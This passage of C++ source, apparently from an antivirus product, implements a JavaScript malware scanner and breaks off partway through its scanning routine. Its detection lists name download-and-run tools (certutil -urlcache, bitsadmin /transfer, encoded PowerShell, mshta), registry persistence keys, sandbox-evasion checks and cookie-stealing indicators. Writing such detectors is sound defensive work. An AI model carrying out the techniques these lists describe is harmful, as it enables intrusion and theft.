/*
 * ShadowStrike - Enterprise NGAV/EDR Platform
 * Copyright (C) 2026 ShadowStrike Security
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */
/**
 * ============================================================================
 * ShadowStrike NGAV - JAVASCRIPT SCANNER IMPLEMENTATION
 * ============================================================================
 *
 * @file JavaScriptScanner.cpp
 * @brief Enterprise-grade JavaScript/JScript malware detection engine.
 *
 * Implements comprehensive detection of JavaScript-based threats including:
 * - Windows Script Host (WSH) malware
 * - ActiveX/COM object abuse
 * - Obfuscation techniques (eval chains, encoding, packers)
 * - Downloaders and droppers
 * - Node.js supply chain attacks
 * - Browser-based threats (cryptojacking, exploit kits)
 *
 * @author ShadowStrike Security Team
 * @version 3.0.0
 * @date 2026
 * @copyright (c) 2026 ShadowStrike Security. All rights reserved.
 *
 * LICENSE: Proprietary - ShadowStrike Enterprise License
 * ============================================================================
 */

#include "pch.h"
#include "JavaScriptScanner.hpp"

#include "../Utils/FileUtils.hpp"
#include "../Utils/Base64Utils.hpp"

#include <regex>
#include <cmath>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cctype>

namespace ShadowStrike {
namespace Scripts {

// ============================================================================
// LOGGING CATEGORY
// ============================================================================

static constexpr const wchar_t* LOG_CATEGORY = L"JavaScriptScanner";

// ============================================================================
// INTERNAL CONSTANTS
// ============================================================================

namespace {

    /// Maximum lines to flag in result
    constexpr size_t MAX_FLAGGED_LINES = 50;

    /// Maximum IOCs to extract
    constexpr size_t MAX_EXTRACTED_IOCS = 100;

    /// Minimum script length for analysis
    constexpr size_t MIN_SCRIPT_LENGTH = 10;

    /// Risk score thresholds
    constexpr int RISK_THRESHOLD_SUSPICIOUS = 30;
    constexpr int RISK_THRESHOLD_MALICIOUS = 70;

    /// Suspicious ActiveX objects (lowercase for comparison)
    const std::vector<std::string> SUSPICIOUS_ACTIVEX_OBJECTS = {
        "wscript.shell",
        "scripting.filesystemobject",
        "shell.application",
        "adodb.stream",
        "msxml2.xmlhttp",
        "winhttp.winhttprequest",
        "scripting.dictionary",
        "schedule.service",
        "wmi",
        "winmgmts",
        "msxml2.domdocument",
        "wbemscripting.swbemlocator",
        "wscript.network",
        "adodb.recordset",
        "scripting.encoder",
        "microsoft.xmldom",
        "internetexplorer.application",
        "outlook.application",
        "msxml2.serverxmlhttp",
        "adodb.connection",
    };

    /// Dangerous method patterns
    const std::vector<std::pair<std::string, int>> DANGEROUS_METHODS = {
        {"run", 15},
        {"exec", 20},
        {"shellexecute", 25},
        {"createobject", 15},
        {"getobject", 10},
        {"write", 5},
        {"saveas", 10},
        {"savetofile", 15},
        {"createtextfile", 10},
        {"deletefile", 15},
        {"copyfile", 10},
        {"movefile", 10},
        {"regread", 15},
        {"regwrite", 20},
        {"regdelete", 20},
        {"send", 10},
        {"open", 5},
        {"responsetext", 5},
        {"responsebody", 5},
        {"eval", 25},
        {"execute", 20},
        {"spawn", 20},
        {"fork", 15},
        {"child_process", 25}
    };

    /// Obfuscation indicators
    const std::vector<std::pair<std::string, JSObfuscationType>> OBFUSCATION_PATTERNS = {
        {"eval(", JSObfuscationType::EvalChain},
        {"eval (", JSObfuscationType::EvalChain},
        {"fromcharcode", JSObfuscationType::CharCodeEncoding},
        {"string.fromcharcode", JSObfuscationType::CharCodeEncoding},
        {"\\u00", JSObfuscationType::UnicodeEscape},
        {"\\x", JSObfuscationType::HexEncoding},
        {"atob(", JSObfuscationType::Base64},
        {"atob (", JSObfuscationType::Base64},
        {"[][(![]+[])", JSObfuscationType::JSFuck},
        {"(+[![]]+[])", JSObfuscationType::JSFuck},
        {"゚ω゚", JSObfuscationType::AAEncode},
        {"$=~[]", JSObfuscationType::JJEncode},
        {"eval(function(p,a,c,k,e", JSObfuscationType::PackerCompression}
    };

    /// Network activity patterns
    const std::vector<std::string> NETWORK_PATTERNS = {
        "xmlhttprequest",
        "msxml2.xmlhttp",
        "winhttp.winhttprequest",
        "fetch(",
        "fetch (",
        "axios",
        "$.ajax",
        "$.get",
        "$.post",
        "http.request",
        "https.request",
        "net.connect",
        "socket"
    };

    /// Malware family signatures
    struct FamilySignature {
        std::string pattern;
        std::string familyName;
        JSThreatCategory category;
        int riskBoost;
    };

    const std::vector<FamilySignature> FAMILY_SIGNATURES = {
        {"nemucod", "Nemucod", JSThreatCategory::Downloader, 40},
        {"locky", "Locky", JSThreatCategory::Ransomware, 50},
        {"cerber", "Cerber", JSThreatCategory::Ransomware, 50},
        {"raa ransomware", "RAA", JSThreatCategory::Ransomware, 50},
        {"cryptojs", "CryptoMiner", JSThreatCategory::CryptoMiner, 30},
        {"coinhive", "CoinHive", JSThreatCategory::CryptoMiner, 40},
        {"cryptonight", "CryptoMiner", JSThreatCategory::CryptoMiner, 35},
        {"miner.start", "CryptoMiner", JSThreatCategory::CryptoMiner, 40},
        {"keylogger", "Keylogger", JSThreatCategory::Keylogger, 45},
        {"onkeydown", "FormGrabber", JSThreatCategory::FormGrabber, 20},
        {"onkeypress", "FormGrabber", JSThreatCategory::FormGrabber, 20},
        {"document.cookie", "InfoStealer", JSThreatCategory::InfoStealer, 15},
        {"localstorage", "InfoStealer", JSThreatCategory::InfoStealer, 10}
    };

    /// URL/IP regex patterns for IOC extraction
    /// THREAD SAFETY: std::regex is NOT safe for concurrent matching in MSVC.
    /// Use thread_local to guarantee each thread has its own regex instance.
    const std::regex& GetURLRegex() {
        thread_local const std::regex re(
            R"((https?:\/\/[^\s\"'<>\)\]]{1,2000}))",
            std::regex::icase | std::regex::optimize
        );
        return re;
    }

    const std::regex& GetIPRegex() {
        thread_local const std::regex re(
            R"(\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b)",
            std::regex::optimize
        );
        return re;
    }

    const std::regex& GetDomainRegex() {
        thread_local const std::regex re(
            R"(\b([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b)",
            std::regex::optimize
        );
        return re;
    }

    const std::regex& GetActiveXRegex() {
        thread_local const std::regex re(
            R"((new\s+activexobject|createobject|getobject)\s*\(\s*[\"']([^\"']+)[\"'])",
            std::regex::icase | std::regex::optimize
        );
        return re;
    }

    /// LOLbin patterns (Living Off the Land Binary abuse)
    const std::vector<std::pair<std::string, int>> LOLBIN_PATTERNS = {
        {"powershell.exe", 30},
        {"powershell -", 25},
        {"powershell -enc", 40},
        {"cmd.exe /c", 20},
        {"mshta.exe", 30},
        {"mshta ", 25},
        {"certutil -decode", 35},
        {"certutil -urlcache", 35},
        {"bitsadmin /transfer", 30},
        {"wmic process call create", 35},
        {"regsvr32 /s /n /u", 30},
        {"rundll32", 20},
        {"msbuild", 15},
        {"cscript.exe", 15},
        {"wscript.exe", 15},
    };

    /// Sandbox / VM evasion indicators
    const std::vector<std::pair<std::string, int>> SANDBOX_EVASION_PATTERNS = {
        {"wscript.sleep", 10},
        {"vmware", 20},
        {"virtualbox", 20},
        {"vbox", 15},
        {"sandbox", 15},
        {"screen.width", 8},
        {"screen.height", 8},
        {"navigator.plugins.length", 10},
        {"getobject(\"winmgmts", 20},
        {"win32_computersystem", 20},
        {"win32_bios", 15},
    };

    /// Persistence indicators
    const std::vector<std::pair<std::string, int>> PERSISTENCE_PATTERNS = {
        {"currentversion\\\\run", 30},
        {"currentversion\\run", 30},
        {"startup", 10},
        {"schtasks", 25},
        {"at /every", 20},
    };

    /// JSE / WSF / HTA content markers
    constexpr const char* JSE_START_MARKER   = "#@~^";
    constexpr const char* JSE_END_MARKER     = "==^#~@";
    constexpr const char* WSF_JOB_TAG        = "<job";
    constexpr const char* WSF_PACKAGE_TAG    = "<package";
    constexpr const char* WSF_SCRIPT_TAG     = "<script";
    constexpr const char* HTA_APP_TAG        = "<hta:application";

    /// Maximum replacements during deobfuscation to prevent infinite loops
    constexpr size_t MAX_DEOBFUSCATION_REPLACEMENTS = 256;

    /// WSE (Windows Script Encoder) pick table — determines which of the 3
    /// substitution tables to use for each encoded character position.
    constexpr uint8_t kWsePick[64] = {
        1,2,0,1,2,0,2,0,0,2,0,2,1,0,2,0,
        1,0,2,0,1,1,2,0,0,2,1,0,2,0,0,2,
        1,1,0,2,0,2,0,1,0,1,1,2,0,1,0,2,
        1,0,2,0,1,1,2,0,0,1,1,2,0,1,0,2
    };

    /// WSE substitution tables — map encoded byte → decoded byte.
    /// Only printable ASCII (0x21-0x7E) is substituted; all other bytes
    /// pass through unchanged.  Derived from the well-known scrdec18
    /// algorithm (public domain).
    constexpr uint8_t kWseDecode[3][128] = {
        // Table 0
        {
            0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,
            0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F,
            0x20,0x79,0x22,0x23,0x24,0x25,0x26,0x60,0x5F,0x28,0x2A,0x2B,0x7E,0x2D,0x7C,0x41,
            0x5E,0x30,0x5C,0x27,0x5B,0x3E,0x2C,0x36,0x3A,0x3D,0x29,0x75,0x3C,0x49,0x34,0x2E,
            0x37,0x32,0x21,0x2F,0x38,0x35,0x5A,0x52,0x59,0x56,0x57,0x4E,0x4B,0x50,0x4D,0x55,
            0x4C,0x54,0x45,0x39,0x33,0x53,0x46,0x31,0x47,0x51,0x58,0x44,0x48,0x42,0x43,0x3F,
            0x40,0x70,0x74,0x67,0x64,0x6D,0x6A,0x7A,0x78,0x61,0x65,0x6B,0x6E,0x71,0x62,0x6F,
            0x72,0x66,0x73,0x68,0x3B,0x69,0x77,0x63,0x76,0x6C,0x7B,0x5D,0x4F,0x7D,0x4A,0x7F
        },
        // Table 1
        {
            0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,
            0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F,
            0x20,0x6E,0x22,0x23,0x24,0x25,0x26,0x35,0x75,0x28,0x2A,0x2B,0x40,0x2D,0x5D,0x30,
            0x43,0x45,0x29,0x78,0x2C,0x4C,0x5E,0x32,0x7C,0x27,0x5F,0x7A,0x3C,0x47,0x60,0x2E,
            0x2F,0x4B,0x21,0x39,0x62,0x53,0x56,0x4D,0x5C,0x73,0x67,0x36,0x33,0x6B,0x7E,0x52,
            0x58,0x4F,0x71,0x51,0x55,0x5B,0x50,0x46,0x4E,0x34,0x5A,0x3F,0x3D,0x74,0x57,0x31,
            0x42,0x37,0x41,0x38,0x7B,0x70,0x76,0x61,0x3B,0x7D,0x6D,0x64,0x69,0x3E,0x66,0x6F,
            0x48,0x65,0x6C,0x49,0x68,0x3A,0x44,0x54,0x72,0x4A,0x6A,0x63,0x59,0x79,0x77,0x7F
        },
        // Table 2
        {
            0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,
            0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F,
            0x20,0x65,0x22,0x23,0x24,0x25,0x26,0x41,0x77,0x28,0x2A,0x2B,0x2F,0x2D,0x4F,0x42,
            0x67,0x2C,0x5F,0x34,0x64,0x5C,0x7E,0x60,0x4C,0x70,0x5E,0x37,0x3C,0x53,0x40,0x2E,
            0x73,0x38,0x21,0x30,0x6A,0x3D,0x29,0x4B,0x6E,0x72,0x44,0x6B,0x4E,0x79,0x39,0x7B,
            0x46,0x35,0x4A,0x63,0x7C,0x56,0x6D,0x3E,0x7A,0x4D,0x45,0x27,0x55,0x3F,0x32,0x31,
            0x36,0x6F,0x71,0x3A,0x69,0x75,0x43,0x57,0x3B,0x68,0x7D,0x74,0x6C,0x62,0x5A,0x61,
            0x78,0x76,0x5D,0x50,0x5B,0x58,0x59,0x48,0x51,0x52,0x66,0x49,0x47,0x54,0x33,0x7F
        }
    };

    /// JSON-escape a string for safe embedding in JSON values.
    [[nodiscard]] std::string JsonEscape(std::string_view str) {
        std::string out;
        out.reserve(str.size() + 16);
        for (const char c : str) {
            switch (c) {
                case '"':  out += "\\\""; break;
                case '\\': out += "\\\\"; break;
                case '\n': out += "\\n";  break;
                case '\r': out += "\\r";  break;
                case '\t': out += "\\t";  break;
                default:
                    if (static_cast<unsigned char>(c) < 0x20) {
                        char buf[8];
                        std::snprintf(buf, sizeof(buf), "\\u%04x",
                                      static_cast<unsigned>(static_cast<unsigned char>(c)));
                        out += buf;
                    } else {
                        out += c;
                    }
            }
        }
        return out;
    }

}  // anonymous namespace

// ============================================================================
// PIMPL IMPLEMENTATION CLASS
// ============================================================================

class JavaScriptScannerImpl {
public:
    JavaScriptScannerImpl();
    ~JavaScriptScannerImpl();

    // Lifecycle
    [[nodiscard]] bool Initialize(const JSScanConfig& config);
    void Shutdown();
    [[nodiscard]] bool IsInitialized() const noexcept;
    [[nodiscard]] ModuleStatus GetStatus() const noexcept;
    [[nodiscard]] bool UpdateConfig(const JSScanConfig& config);
    [[nodiscard]] JSScanConfig GetConfig() const;

    // Scanning
    [[nodiscard]] JSScanResult ScanContent(
        std::string_view content,
        std::string_view sourceName,
        uint32_t processId);

    [[nodiscard]] JSScanResult ScanFile(
        const std::filesystem::path& path,
        uint32_t processId);

    // Analysis
    [[nodiscard]] JSEngineType DetectEngineType(std::string_view content);
    [[nodiscard]] JSObfuscationDetails AnalyzeObfuscation(std::string_view content);
    [[nodiscard]] std::string Deobfuscate(std::string_view content, size_t maxDepth);
    [[nodiscard]] std::vector<std::string> ExtractIOCs(std::string_view content);
    [[nodiscard]] std::vector<ActiveXUsage> DetectActiveXUsage(std::string_view content);
    [[nodiscard]] std::vector<JSNetworkActivity> DetectNetworkActivity(std::string_view content);

    // Callbacks
    void RegisterCallback(ScanResultCallback callback);
    void RegisterErrorCallback(ErrorCallback callback);
    void UnregisterCallbacks();

    // Statistics
    [[nodiscard]] JSStatistics GetStatistics() const;
    void ResetStatistics();
    [[nodiscard]] bool SelfTest();

private:
    // Configuration
    mutable std::shared_mutex m_configMutex;
    JSScanConfig m_config;

    // State
    std::atomic<ModuleStatus> m_status{ModuleStatus::Uninitialized};
    std::atomic<bool> m_initialized{false};

    // Callbacks
    mutable std::shared_mutex m_callbackMutex;
    std::vector<ScanResultCallback> m_callbacks;
    std::vector<ErrorCallback> m_errorCallbacks;

    // Statistics
    mutable JSStatistics m_stats;

    // Internal methods
    [[nodiscard]] double CalculateEntropy(std::string_view content) const;
    [[nodiscard]] int CalculateRiskScore(
        const std::vector<ActiveXUsage>& activeX,
        const std::vector<JSNetworkActivity>& network,
        const JSObfuscationDetails& obfuscation,
        std::string_view content) const;

    [[nodiscard]] std::string ComputeContentHash(std::string_view content) const;
    [[nodiscard]] std::vector<std::pair<size_t, std::string>> FindFlaggedLines(
        std::string_view content) const;

    [[nodiscard]] std::pair<JSThreatCategory, std::string> DetectMalwareFamily(
        std::string_view content,
        int& riskBoost) const;

    void NotifyCallbacks(const JSScanResult& result);
    void NotifyError(const std::string& message, int code);

    [[nodiscard]] std::string ToLower(std::string_view str) const;
    [[nodiscard]] bool ContainsIgnoreCase(std::string_view haystack, std::string_view needle) const;

    [[nodiscard]] std::string DecodeBase64Segments(std::string_view content) const;
    [[nodiscard]] std::string DecodeCharCodeSequences(std::string_view content) const;
    [[nodiscard]] std::string DecodeHexEscapes(std::string_view content) const;
    [[nodiscard]] std::string DecodeUnicodeEscapes(std::string_view content) const;

    // JSE / WSF / HTA support
    [[nodiscard]] bool IsJSEContent(std::string_view content) const noexcept;
    [[nodiscard]] std::string DecodeJSE(std::string_view content) const;
    [[nodiscard]] std::string ExtractScriptFromWSF(std::string_view content) const;
    [[nodiscard]] std::string ExtractScriptFromHTA(std::string_view content) const;
    [[nodiscard]] bool IsHTAContent(std::string_view content) const noexcept;
    [[nodiscard]] bool IsWSFContent(std::string_view content) const noexcept;

    // Deadline enforcement
    [[nodiscard]] bool IsDeadlineExceeded(TimePoint deadline) const noexcept;
};

// ============================================================================
// JAVASCRIPTSCANNER IMPLEMENTATION (SINGLETON WRAPPER)
// ============================================================================

std::atomic<bool> JavaScriptScanner::s_instanceCreated{false};

JavaScriptScanner& JavaScriptScanner::Instance() noexcept {
    static JavaScriptScanner instance;
    return instance;
}

bool JavaScriptScanner::HasInstance() noexcept {
    return s_instanceCreated.load(std::memory_order_acquire);
}

JavaScriptScanner::JavaScriptScanner()
    : m_impl(std::make_unique<JavaScriptScannerImpl>()) {
    s_instanceCreated.store(true, std::memory_order_release);
    SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner instance created");
}

JavaScriptScanner::~JavaScriptScanner() {
    if (m_impl) {
        m_impl->Shutdown();
    }
    s_instanceCreated.store(false, std::memory_order_release);
    SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner instance destroyed");
}

bool JavaScriptScanner::Initialize(const JSScanConfig& config) {
    return m_impl->Initialize(config);
}

void JavaScriptScanner::Shutdown() {
    m_impl->Shutdown();
}

bool JavaScriptScanner::IsInitialized() const noexcept {
    return m_impl->IsInitialized();
}

ModuleStatus JavaScriptScanner::GetStatus() const noexcept {
    return m_impl->GetStatus();
}

bool JavaScriptScanner::UpdateConfig(const JSScanConfig& config) {
    return m_impl->UpdateConfig(config);
}

JSScanConfig JavaScriptScanner::GetConfig() const {
    return m_impl->GetConfig();
}

JSScanResult JavaScriptScanner::ScanFile(const std::filesystem::path& path) {
    return m_impl->ScanFile(path, 0);
}

JSScanResult JavaScriptScanner::ScanFile(
    const std::filesystem::path& path,
    uint32_t processId) {
    return m_impl->ScanFile(path, processId);
}

JSScanResult JavaScriptScanner::ScanMemory(
    std::span<const char> content,
    std::string_view sourceName) {
    return m_impl->ScanContent(
        std::string_view(content.data(), content.size()),
        sourceName,
        0);
}

JSScanResult JavaScriptScanner::ScanMemory(
    std::span<const char> content,
    std::string_view sourceName,
    uint32_t processId) {
    return m_impl->ScanContent(
        std::string_view(content.data(), content.size()),
        sourceName,
        processId);
}

JSScanResult JavaScriptScanner::ScanString(
    std::string_view content,
    std::string_view sourceName) {
    return m_impl->ScanContent(content, sourceName, 0);
}

JSEngineType JavaScriptScanner::DetectEngineType(std::string_view content) {
    return m_impl->DetectEngineType(content);
}

JSObfuscationDetails JavaScriptScanner::AnalyzeObfuscation(std::string_view content) {
    return m_impl->AnalyzeObfuscation(content);
}

std::string JavaScriptScanner::Deobfuscate(std::string_view content, size_t maxDepth) {
    return m_impl->Deobfuscate(content, maxDepth);
}

std::vector<std::string> JavaScriptScanner::ExtractIOCs(std::string_view content) {
    return m_impl->ExtractIOCs(content);
}

std::vector<ActiveXUsage> JavaScriptScanner::DetectActiveXUsage(std::string_view content) {
    return m_impl->DetectActiveXUsage(content);
}

std::vector<JSNetworkActivity> JavaScriptScanner::DetectNetworkActivity(
    std::string_view content) {
    return m_impl->DetectNetworkActivity(content);
}

void JavaScriptScanner::RegisterCallback(ScanResultCallback callback) {
    m_impl->RegisterCallback(std::move(callback));
}

void JavaScriptScanner::RegisterErrorCallback(ErrorCallback callback) {
    m_impl->RegisterErrorCallback(std::move(callback));
}

void JavaScriptScanner::UnregisterCallbacks() {
    m_impl->UnregisterCallbacks();
}

JSStatistics JavaScriptScanner::GetStatistics() const {
    return m_impl->GetStatistics();
}

void JavaScriptScanner::ResetStatistics() {
    m_impl->ResetStatistics();
}

bool JavaScriptScanner::SelfTest() {
    return m_impl->SelfTest();
}

std::string JavaScriptScanner::GetVersionString() noexcept {
    try {
        char buf[32];
        std::snprintf(buf, sizeof(buf), "%u.%u.%u",
                      JSConstants::VERSION_MAJOR,
                      JSConstants::VERSION_MINOR,
                      JSConstants::VERSION_PATCH);
        return std::string(buf);
    } catch (...) {
        return "0.0.0";
    }
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - LIFECYCLE
// ============================================================================

JavaScriptScannerImpl::JavaScriptScannerImpl() {
    m_stats.startTime = Clock::now();
}

JavaScriptScannerImpl::~JavaScriptScannerImpl() {
    Shutdown();
}

bool JavaScriptScannerImpl::Initialize(const JSScanConfig& config) {
    if (m_initialized.load(std::memory_order_acquire)) {
        SS_LOG_WARN(LOG_CATEGORY, L"JavaScriptScanner already initialized");
        return true;
    }

    m_status.store(ModuleStatus::Initializing, std::memory_order_release);

    try {
        // Validate configuration
        if (!config.IsValid()) {
            SS_LOG_ERROR(LOG_CATEGORY, L"Invalid configuration provided");
            m_status.store(ModuleStatus::Error, std::memory_order_release);
            return false;
        }

        {
            std::unique_lock lock(m_configMutex);
            m_config = config;
        }

        // Reset statistics
        ResetStatistics();

        m_initialized.store(true, std::memory_order_release);
        m_status.store(ModuleStatus::Running, std::memory_order_release);

        SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner initialized successfully");
        return true;

    } catch (const std::exception& e) {
        SS_LOG_ERROR(LOG_CATEGORY, L"Initialization failed: %hs", e.what());
        m_status.store(ModuleStatus::Error, std::memory_order_release);
        return false;
    } catch (...) {
        SS_LOG_FATAL(LOG_CATEGORY, L"Unexpected error during initialization");
        m_status.store(ModuleStatus::Error, std::memory_order_release);
        return false;
    }
}

void JavaScriptScannerImpl::Shutdown() {
    if (!m_initialized.load(std::memory_order_acquire)) {
        return;
    }

    m_status.store(ModuleStatus::Stopping, std::memory_order_release);

    // Clear callbacks
    UnregisterCallbacks();

    m_initialized.store(false, std::memory_order_release);
    m_status.store(ModuleStatus::Stopped, std::memory_order_release);

    SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner shut down");
}

bool JavaScriptScannerImpl::IsInitialized() const noexcept {
    return m_initialized.load(std::memory_order_acquire);
}

ModuleStatus JavaScriptScannerImpl::GetStatus() const noexcept {
    return m_status.load(std::memory_order_acquire);
}

bool JavaScriptScannerImpl::UpdateConfig(const JSScanConfig& config) {
    if (!config.IsValid()) {
        SS_LOG_ERROR(LOG_CATEGORY, L"Invalid configuration update rejected");
        return false;
    }

    std::unique_lock lock(m_configMutex);
    m_config = config;

    SS_LOG_INFO(LOG_CATEGORY, L"Configuration updated");
    return true;
}

JSScanConfig JavaScriptScannerImpl::GetConfig() const {
    std::shared_lock lock(m_configMutex);
    return m_config;
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - SCANNING
// ============================================================================

JSScanResult JavaScriptScannerImpl::ScanFile(
    const std::filesystem::path& path,
    uint32_t processId) {

    JSScanResult result;
    result.scanTime = std::chrono::system_clock::now();
    result.filePath = path;
    result.processId = processId;

    const auto startTime = Clock::now();

    try {
        // Validate file exists
        std::error_code ec;
        if (!std::filesystem::exists(path, ec)) {
            result.status = JSScanStatus::ErrorFileAccess;
            result.description = "File not found";
            SS_LOG_WARN(LOG_CATEGORY, L"File not found: %ls", path.wstring().c_str());
            return result;
        }

        // Check file size
        const auto fileSize = std::filesystem::file_size(path, ec);
        if (ec) {
            result.status = JSScanStatus::ErrorFileAccess;
            result.description = "Cannot get file size";
            return result;
        }

        JSScanConfig config;
        {
            std::shared_lock lock(m_configMutex);
            config = m_config;
        }

        if (fileSize > config.maxScriptSize) {
            result.status = JSScanStatus::SkippedSizeLimit;
            result.description = "File exceeds size limit";
            SS_LOG_DEBUG(LOG_CATEGORY, L"File exceeds size limit: %llu bytes", fileSize);
            return result;
        }

        // Read file content
        std::string content;
        Utils::FileUtils::Error fileError;
        if (!Utils::FileUtils::ReadAllTextUtf8(path.wstring(), content, &fileError)) {
            result.status = JSScanStatus::ErrorFileAccess;
            result.description = "Cannot read file: " + fileError.message;
            SS_LOG_ERROR(LOG_CATEGORY, L"Cannot read file: %ls (error %u)",
                         path.wstring().c_str(), fileError.win32);
            return result;
        }

        // Perform scan
        result = ScanContent(content, path.filename().string(), processId);
        result.filePath = path;

    } catch (const std::exception& e) {
        result.status = JSScanStatus::ErrorInternal;
        result.description = std::string("Internal error: ") + e.what();
        SS_LOG_ERROR(LOG_CATEGORY, L"Exception scanning file: %hs", e.what());
        NotifyError(e.what(), -1);
    }

    result.scanDuration = std::chrono::duration_cast<std::chrono::microseconds>(
        Clock::now() - startTime);

    return result;
}

JSScanResult JavaScriptScannerImpl::ScanContent(
    std::string_view content,
    std::string_view sourceName,
    uint32_t processId) {

    JSScanResult result;
    result.scanTime = std::chrono::system_clock::now();
    result.processId = processId;

    const auto startTime = Clock::now();

    // Update statistics
    m_stats.totalScans.fetch_add(1, std::memory_order_relaxed);
    m_stats.totalBytesScanned.fetch_add(content.size(), std::memory_order_relaxed);

    try {
        JSScanConfig config;
        {
            std::shared_lock lock(m_configMutex);
            config = m_config;
        }

        // Check if scanning is enabled
        if (!config.enabled) {
            result.status = JSScanStatus::Clean;
            result.description = "Scanning disabled";
            return result;
        }

        // Validate content size
        if (content.size() < MIN_SCRIPT_LENGTH) {
            result.status = JSScanStatus::Clean;
            result.description = "Content too small for analysis";
            return result;
        }

        if (content.size() > config.maxScriptSize) {
            result.status = JSScanStatus::SkippedSizeLimit;
            result.description = "Content exceeds size limit";
            return result;
        }

        // Establish scan deadline to prevent ReDoS / long hangs
        const auto deadline = startTime +
            std::chrono::milliseconds(config.scanTimeoutMs);

        // Compute content hash
        result.sha256 = ComputeContentHash(content);

        // Whitelist check by hash
        if (!result.sha256.empty()) {
            try {
                auto& wls = Whitelist::WhiteListStore::Instance();
                if (wls.IsHashWhitelisted(result.sha256)) {
                    result.status = JSScanStatus::SkippedWhitelisted;
                    result.description = "Content hash whitelisted";
                    SS_LOG_DEBUG(LOG_CATEGORY, L"Hash whitelisted: %hs",
                                 result.sha256.c_str());
                    return result;
                }
            } catch (...) {
                SS_LOG_DEBUG(LOG_CATEGORY, L"WhitelistStore unavailable, skipping check");
            }
        }

        // ---------------------------------------------------------------
        // JSE / WSF / HTA pre-processing
        // ---------------------------------------------------------------
        std::string workingContent;

        if (IsJSEContent(content)) {
            // JSE-encoded content detected
            if (config.blockEncodedScripts) {
                result.status = JSScanStatus::Malicious;
                result.isMalicious = true;
                result.riskScore = 100;
                result.category = JSThreatCategory::Dropper;
                result.threatName = "JS/Encoded.Suspicious";
                result.description = "JScript.Encode detected — blocked by policy";
                m_stats.maliciousDetected.fetch_add(1, std::memory_order_relaxed);
                NotifyCallbacks(result);
                result.scanDuration = std::chrono::duration_cast<
                    std::chrono::microseconds>(Clock::now() - startTime);
                return result;
            }
            // Attempt decode for further analysis
            workingContent = DecodeJSE(content);
            content = workingContent;
        } else if (IsWSFContent(content)) {
            workingContent = ExtractScriptFromWSF(content);
            if (!workingContent.empty()) {
                content = workingContent;
            }
        } else if (IsHTAContent(content)) {
            workingContent = ExtractScriptFromHTA(content);
            if (!workingContent.empty()) {
                content = workingContent;
            }
        }

        // Detect engine type
        result.targetEngine = DetectEngineType(content);
        {
            const auto idx = static_cast<size_t>(result.targetEngine);
            if (idx < m_stats.byEngine.size()) {
                m_stats.byEngine[idx].fetch_add(1, std::memory_order_relaxed);
            }
        }

        if (IsDeadlineExceeded(deadline)) {
            result.status = JSScanStatus::ErrorTimeout;
            result.description = "Scan deadline exceeded during engine detection";
            m_stats.timeouts.fetch_add(1, std::memory_order_relaxed);
            return result;
        }

        // Analyze obfuscation
        if (config.enableDeobfuscation) {
            result.obfuscation = AnalyzeObfuscation(content);
            if (result.obfuscation.primaryType != JSObfuscationType::None) {
                m_stats.obfuscatedDetected.fetch_add(1, std::memory_order_relaxed);
            }
        }

        if (IsDeadlineExceeded(deadline)) {
            result.status = JSScanStatus::ErrorTimeout;
            result.description = "Scan deadline exceeded during obfuscation analysis";
            m_stats.timeouts.fetch_add(1, std::memory_order_relaxed);
            return result;
        }

        // Detect ActiveX usage
        result.activeXUsage = DetectActiveXUsage(content);
        if (!result.activeXUsage.empty()) {
            size_t suspiciousCount = 0;
            for (const auto& ax : result.activeXUsage) {
                if (ax.isSuspicious) {
                    suspiciousCount++;
                }
            }
            if (suspiciousCount > 0) {
                m_stats.activeXAbuse.fetch_add(suspiciousCount, std::memory_order_relaxed);
            }
        }

        // Detect network activity
        result.networkActivity = DetectNetworkActivity(content);

        if (IsDeadlineExceeded(deadline)) {
            result.status = JSScanStatus::ErrorTimeout;
            result.description = "Scan deadline exceeded during pattern analysis";
            m_stats.timeouts.fetch_add(1, std::memory_order_relaxed);
            return result;
        }

        // Extract IOCs
        result.extractedIOCs = ExtractIOCs(content);

        // Find flagged lines
        result.flaggedLines = FindFlaggedLines(content);

        // Detect malware family
        int familyRiskBoost = 0;
        auto [category, familyName] = DetectMalwareFamily(content, familyRiskBoost);
        if (category != JSThreatCategory::None) {
            result.category = category;
            result.detectedFamily = familyName;
        }

        if (IsDeadlineExceeded(deadline)) {
            result.status = JSScanStatus::ErrorTimeout;
            result.description = "Scan deadline exceeded during family detection";
            m_stats.timeouts.fetch_add(1, std::memory_order_relaxed);
            return result;
        }

        // Calculate risk score
        result.riskScore = CalculateRiskScore(
            result.activeXUsage,
            result.networkActivity,
            result.obfuscation,
            content);
        result.riskScore += familyRiskBoost;

        // Apply blocking policies as additive risk
        if (config.blockActiveX) {
            for (const auto& ax : result.activeXUsage) {
                if (ax.isSuspicious) {
                    result.riskScore += 30;
